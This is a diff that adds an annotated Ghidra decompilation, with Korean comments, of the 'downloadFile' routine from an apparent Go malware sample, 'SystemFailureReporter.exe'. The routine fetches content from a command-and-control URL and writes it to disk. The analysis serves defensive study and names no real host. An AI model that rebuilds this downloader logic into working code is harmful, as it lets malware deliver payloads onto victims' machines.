@@ -1,0 +1,72 @@
+// SystemFailureReporter.exe - main.downloadFile 함수
+// Ghidra 디컴파일 분석
+
+void main.downloadFile(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)
+{
+  uStack0000000000000008 = param_1;               // C2 URL 포인터
+  uStack0000000000000018 = param_3;               // 저장할 파일 경로 포인터  
+  uStack0000000000000020 = param_4;               // 파일 경로 길이
+  
+                    /* rs/stg/stg.go:12 */
+  while (&local_28 <= *(undefined8 **)(unaff_R14 + 0x10)) {
+                    /* rs/stg/stg.go:12 */
+    runtime.morestack_noctxt();
+  }
+  
+                    /* rs/stg/stg.go:13 */
+                    /* net/http/client.go:453 */
+  net/http.(*Client).Get((http.Client *)PTR_DAT_0096bda0,uStack0000000000000008,param_2);
+                    /* C2 서버에 HTTP GET 요청 (기본 클라이언트 사용) */
+                    /* rs/stg/stg.go:14 */
+  if (extraout_RBX != 0) {                        // HTTP 요청 실패 시 ( 인자값에 따른 RBX )
+                    /* rs/stg/stg.go:15 */
+    return;                                       // 에러 발생 시 함수 종료
+  }
+  
+                    /* rs/stg/stg.go:17 */
+  local_28 = *(undefined8 *)(extraout_RAX + 0x40); // HTTP Response Body 포인터
+  local_20 = *(undefined8 *)(extraout_RAX + 0x48); 
+  local_30 = main.downloadFile.deferwrap1;        // defer - HTTP Response 정리 함수
+  local_18 = &local_30;                           // defer 대입
+  
+                    /* rs/stg/stg.go:19 */
+                    /* os/file.go:380 */
+  os.OpenFile(uStack0000000000000018,uStack0000000000000020,0x242,0x1b6);
+                    /* 저장할 파일 열기 */
+                    /* rs/stg/stg.go:20 */
+  if (extraout_RBX_00 != 0) {                     // 파일 열기 실패 시
+                    /* rs/stg/stg.go:21 */
+    (**local_18)();                               // defer 함수 실행 (Response 정리)
+    return;                                       // 파일 열기 에러로 종료
+  }
+  
+                    /* rs/stg/stg.go:23 */
+  local_40[0] = main.downloadFile.deferwrap2;     // defer: 파일 닫기 함수
+  ppcStack_10 = local_40;                         // defer 대입
+  
+                    /* rs/stg/stg.go:25 */
+  iVar3 = *(int *)(extraout_RAX + 0x40);          // Response Body Reader 인터페이스
+  uVar1 = *(undefined8 *)(extraout_RAX + 0x48);
+  if (iVar3 != 0) {                               // Body Reader가 존재하면
+    uVar2 = (uint)*(dword *)(iVar3 + 0x10);
+    do {
+      iVar4 = (uVar2 & *(uint *)PTR_DAT_0096d7c0) * 0x10;
+      if (*(int *)(PTR_DAT_0096d7c0 + iVar4 + 8) == *(int *)(iVar3 + 8)) {
+        iVar3 = *(int *)(PTR_DAT_0096d7c0 + iVar4 + 0x10);
+        goto LAB_0062b0c4;                        // 이동
+      }
+      uVar2 = uVar2 + 1;
+    } while (*(int *)(PTR_DAT_0096d7c0 + iVar4 + 8) != 0);
+    
+    runtime.typeAssert(&PTR_DAT_0096d7c0,*(int *)(iVar3 + 8));
+    iVar3 = extraout_RAX_01;
+  }
+  
+LAB_0062b0c4:
+                    /* io/io.go:388 */
+  io.copyBuffer(&PTR_datatype.Interface.io.Writer_00784400,extraout_RAX_00,iVar3,uVar1,0,0,0); // 파일 복사
+                    /* rs/stg/stg.go:26 */
+  (**ppcStack_10)();
+  (**local_18)();                                 // defer - HTTP Response 정리
+  return;                                         // 다운로드 완료
+}
